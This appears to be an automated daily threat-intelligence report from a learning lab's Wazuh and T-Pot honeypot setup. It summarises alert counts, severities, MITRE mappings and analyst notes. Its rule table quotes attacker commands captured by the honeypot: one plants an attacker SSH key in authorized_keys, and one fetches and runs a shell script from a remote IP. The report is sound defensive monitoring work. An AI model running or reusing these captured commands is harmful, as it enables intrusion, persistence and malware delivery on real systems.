# LearningLab01 Daily Threat Intelligence Report — 2026-09-22

Generated: 2026-09-22T13:15:05.055Z

Report window: 2026-09-21T13:15:05.029Z through 2026-09-22T13:15:05.029Z

> This report summarizes security telemetry and honeypot activity. An alert indicates that a rule matched observed activity; it does not automatically prove that a system was compromised.

## Executive Summary

| Metric | Count |
|---|---:|
| Wazuh alerts | 177,071 |
| Attack-related alerts | 10,382 |
| Honeypot interactions | 168,420 |
| Authentication failures | 2,761 |
| Authentication successes | 722 |
| Critical alerts | 183 |
| High alerts | 661 |
| T-Pot artifacts observed | 0 |
| Malicious artifact detections | 0 |

### Notable Observations

- 183 critical-severity alerts require priority review.
- 661 high-severity alerts should be reviewed after the critical queue.
- Authentication failures exceeded successful authentications by a ratio of 3.82:1.
- Country attribution currently covers only 1.76% of alerts. Country totals should be treated as partial telemetry.
- The most frequent rule was 110209: T-Pot Conpot snmp event from [IP address]: SNMPv2 Bulk (103,400 alerts).

## Wazuh Security Monitoring

### Alert Severity

| Severity | Alerts | Percentage |
|---|---:|---:|
| Critical | 183 | 0.10% |
| High | 661 | 0.37% |
| Medium | 2,121 | 1.20% |
| Low | 174,106 | 98.33% |
| Informational | 0 | 0.00% |

Severity represents the priority assigned by the Wazuh rule. Critical and high alerts should be investigated first, but repeated lower-severity events can also reveal scanning, credential attacks, or attacker preparation.

### Authentication Activity

- Authentication failures: 2,761
- Authentication successes: 722
- Failure-to-success ratio: 3.82:1

A successful authentication is not considered an attack by itself. Analysts should correlate successful logins with preceding failures, source addresses, usernames, target systems, and expected activity.

### Attack-Type Breakdown

| Category | Alerts | Percentage of attack-related alerts |
|---|---:|---:|
| Network attack | 4,802 | 46.25% |
| Payload delivery | 4,802 | 46.25% |
| Authentication failure | 2,761 | 26.59% |
| Command execution | 1,897 | 18.27% |
| Reconnaissance | 159 | 1.53% |
| Malware | 146 | 1.41% |
| Web attack | 115 | 1.11% |
| Network scan | 51 | 0.49% |
| SMTP attack | 7 | 0.07% |

> Category counts may overlap because one Wazuh alert can belong to multiple rule groups. The attack-related total counts each alert once.

### Country of Origin

Wazuh supplied country information for 3,118 alerts, representing 1.76% of all alerts.

| Country | Alerts | Percentage of all alerts | Relative volume |
|---|---:|---:|---|
| Unknown | 173,953 | 98.24% | Not geolocated |
| New Zealand | 2,841 | 1.60% | ████████████████████ |
| United Kingdom | 129 | 0.07% | █ |
| United States | 73 | 0.04% | █ |
| Singapore | 15 | 0.01% | █ |
| Russia | 12 | 0.01% | █ |
| Hong Kong | 11 | 0.01% | █ |
| Canada | 7 | 0.00% | █ |
| Romania | 6 | 0.00% | █ |
| Turkey | 6 | 0.00% | █ |
| China | 3 | 0.00% | █ |
| France | 3 | 0.00% | █ |
| Iraq | 3 | 0.00% | █ |
| Japan | 3 | 0.00% | █ |
| Slovakia | 3 | 0.00% | █ |
| Ukraine | 3 | 0.00% | █ |

> Relative-volume bars compare only countries with known geographic attribution. Unknown alerts are excluded from the bar scale.

> Geolocation is approximate. VPNs, proxies, cloud providers, compromised hosts, carrier networks, and incomplete GeoIP coverage can make the apparent country different from the attacker’s location.

### MITRE ATT&CK Tactics

| Tactic | Alerts |
|---|---:|
| Defense Evasion | 292 |
| Initial Access | 292 |
| Persistence | 291 |
| Privilege Escalation | 291 |
| Lateral Movement | 97 |
| Credential Access | 56 |
| Execution | 26 |
| Impact | 12 |
| Command and Control | 5 |

### MITRE ATT&CK Techniques

| Technique | Alerts |
|---|---:|
| Valid Accounts | 291 |
| Remote Services | 97 |
| Brute Force | 56 |
| Command and Scripting Interpreter | 26 |
| Stored Data Manipulation | 12 |
| Ingress Tool Transfer | 5 |
| Disable or Modify Tools | 1 |
| Exploit Public-Facing Application | 1 |

MITRE ATT&CK describes adversary behavior rather than declaring that an attack succeeded. These mappings help analysts connect individual alerts to possible attacker objectives and investigative hypotheses.

### Most Frequent Wazuh Rules

| Rule ID | Highest Level | Alerts | Description | Agents |
|---|---:|---:|---|---|
| 110209 | 5 | 103,400 | T-Pot Conpot snmp event from [IP address]: SNMPv2 Bulk | tpot (103,400) |
| 110207 | 5 | 29,833 | T-Pot SentryPeer SIP activity from [IP address]:59341, method INVITE | tpot (29,833) |
| 110213 | 4 | 21,259 | T-Pot RDP connection from [IP address] to port 3389. | tpot (21,259) |
| 110204 | 4 | 5,036 | T-Pot Honeytrap connection from [IP address] to port 5908 | tpot (5,036) |
| 110205 | 6 | 4,774 | T-Pot Honeytrap received a payload from [IP address] | tpot (4,774) |
| 110219 | 4 | 2,992 | T-Pot CiscoASA web activity from [IP address]: "GET / HTTP/1.1" 200 - | tpot (2,992) |
| 110102 | 5 | 2,761 | Cowrie failed login from [IP address] using username enable. | tpot (2,761) |
| 110101 | 3 | 2,707 | Cowrie SSH connection from [IP address]. | tpot (2,707) |
| 110104 | 7 | 1,686 | Cowrie captured a command from [IP address]: ls /home; /bin/busybox BOTNET | tpot (1,686) |
| 110201 | 4 | 578 | T-Pot Dionaea pptpd connection from [IP address] to port 1723 | tpot (578) |
| 110103 | 10 | 431 | Cowrie accepted login from [IP address] using username system. | tpot (431) |
| 5501 | 3 | 194 | PAM: Login session opened. | tpot (192), wazuh (2) |
| 110109 | 13 | 182 | Cowrie captured a destructive, persistence, or defense-evasion command from [IP address]: cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~ | tpot (182) |
| 5502 | 3 | 165 | PAM: Login session closed. | tpot (163), wazuh (2) |
| 110215 | 4 | 150 | T-Pot MiniPrint event: connection, action open_conn, Connection opened | tpot (150) |
| 110105 | 12 | 116 | Cowrie captured a file download from [IP address]. | tpot (116) |
| 533 | 7 | 113 | Listened ports status (netstat) changed (new port opened or closed). | tpot (113) |
| 110223 | 5 | 97 | T-Pot HoneyAML received  request from  to  on port . | tpot (97) |
| 5715 | 3 | 97 | sshd: authentication success. | tpot (96), wazuh (1) |
| 110221 | 7 | 81 | T-Pot CiscoASA detected configuration discovery from [IP address]: "GET /SETTINGS.CFG HTTP/1.1" 404 - | tpot (81) |
| 110106 | 10 | 56 | Cowrie detected repeated failed logins from [IP address]. | tpot (56) |
| 110216 | 4 | 51 | T-Pot Mailoney received SMTP command from [IP address]: EHLO mail.example.com  | tpot (51) |
| 110214 | 9 | 46 | T-Pot RDP honeypot detected a connection burst from [IP address]. | tpot (46) |
| 110220 | 8 | 44 | T-Pot CiscoASA captured a login request from [IP address]: "POST /login.cgi HTTP/1.1" 200 - | tpot (44) |
| 510 | 7 | 41 | Host-based anomaly detection event (rootcheck). | wazuh (40), tpot (1) |
| 110212 | 10 | 28 | T-Pot Honeytrap detected repeated payload activity from [IP address]. | tpot (28) |
| 110108 | 12 | 25 | Cowrie captured suspicious execution or staging activity from $(src_ip): $(input) | tpot (25) |
| 2904 | 7 | 21 | Dpkg (Debian Package) half configured. | tpot (15), wazuh (6) |
| 110208 | 7 | 18 | T-Pot SentryPeer detected SIP scanner friendly-scanner from [IP address]:5089 | tpot (18) |
| 110224 | 7 | 18 | T-Pot HoneyAML received an HTTP POST from [IP address] to /api/anthropic/v1/messages. | tpot (18) |
| 2902 | 7 | 13 | New dpkg (Debian Package) installed. | tpot (9), wazuh (4) |
| 592 | 8 | 11 | Log file size reduced. | tpot (11) |
| 110217 | 7 | 7 | T-Pot Mailoney captured suspicious SMTP activity from [IP address]: AUTH NTLM TlRMTVNTUAABAAAAB4IIAAAAAAAAAAAAAAAAAAAAAAA=  | tpot (7) |
| 203 | 9 | 7 | Agent event queue is full. Events may be lost. | tpot (7) |
| 110211 | 9 | 5 | T-Pot Dionaea detected a connection burst from [IP address]. | tpot (5) |
| 202 | 7 | 5 | Agent event queue is 90% full. | tpot (5) |
| 205 | 3 | 5 | Agent event queue is back to normal load. | tpot (5) |
| 110107 | 12 | 4 | Cowrie captured a probable payload-retrieval command from [IP address]: cd /tmp 2>/dev/null \|\| cd /var 2>/dev/null \|\| cd /dev/shm 2>/dev/null \|\| cd /run 2>/dev/null \|\| cd /root 2>/dev/null \|\| cd /;rm -f kla.sh;wget -O kla.sh http://[IP address]/bins/kla.sh 2>/dev/null\|\|busybox wget -O kla.sh http://[IP address]/bins/kla.sh 2>/dev/null\|\|curl -sLo kla.sh http://[IP address]/bins/kla.sh 2>/dev/null;chmod 777 kla.sh;sh kla.sh telnet& | tpot (4) |
| 86003 | 3 | 3 | Docker: Error message | tpot (3) |
| 19004 | 7 | 2 | SCA summary: CIS Ubuntu Linux 24.04 LTS Benchmark v1.0.0.: Score less than 50% (47) | tpot (2) |
| 110222 | 9 | 1 | T-Pot CiscoASA detected repeated web requests from one source. | tpot (1) |
| 110225 | 13 | 1 | T-Pot HoneyAML detected a probable remote-code-execution and payload-delivery attempt from [IP address]. | tpot (1) |
| 110226 | 10 | 1 | T-Pot HoneyAML detected repeated web requests from one source. | tpot (1) |
| 19010 | 3 | 1 | CIS Ubuntu Linux 24.04 LTS Benchmark v1.0.0.: Ensure nftables default deny firewall policy.: Status changed from failed to passed | tpot (1) |
| 19011 | 9 | 1 | CIS Ubuntu Linux 24.04 LTS Benchmark v1.0.0.: Ensure nftables default deny firewall policy.: Status changed from passed to failed | tpot (1) |
| 503 | 3 | 1 | Wazuh agent started. | tpot (1) |
| 506 | 3 | 1 | Wazuh agent stopped. | tpot (1) |
| 550 | 7 | 1 | Integrity checksum changed. | wazuh (1) |
| 591 | 3 | 1 | Log file rotated. | tpot (1) |

### New or Previously Unseen Detections

Historical novelty comparison is not enabled in the exporter yet. This section will compare the current report window with the preceding 30-day baseline. Until that comparison is enabled, no rule should be described as new solely because it appears in this report.

### SOC Analyst Learning Notes

1. Begin with critical and high alerts, but validate the underlying event.
2. Determine whether the event represents scanning, attempted access, payload delivery, execution, persistence, or impact.
3. Correlate source IP, username, target, timestamp, and related alerts.
4. Check whether a successful login followed repeated failures.
5. Separate honeypot interaction from activity against production assets.
6. Document evidence supporting both malicious and benign explanations.
7. Escalate based on confirmed risk, affected assets, and confidence—not alert volume alone.

## T-Pot Artifact Intelligence

### Artifact Summary

- Artifacts observed: 0
- Known hashes: 0
- Uploaded or analyzed: 0
- Malicious detections: 0
- Suspicious detections: 0
- Lookup errors: 0

### Artifacts

| SHA-256 | Bytes | Status | Malicious | Suspicious | Undetected | VirusTotal |
|---|---:|---|---:|---:|---:|---|
| No artifacts observed | — | — | — | — | — | — |

## Security Onion Network Monitoring

_Planned integration._

This section will eventually contain Suricata alerts, Zeek observations, network attack types, source-country information, targeted services, new network behaviors, and correlations with Wazuh endpoint alerts.

## Report Limitations

- Alert counts represent rule matches, not necessarily unique attackers.
- Attack-category counts may overlap.
- Honeypot traffic is intentionally exposed and is not equivalent to a compromise of a production system.
- GeoIP attribution is approximate and currently has incomplete coverage.
- VirusTotal results can change as vendors update their detections.

Generated automatically by the LearningLab01 threat-intelligence pipeline.
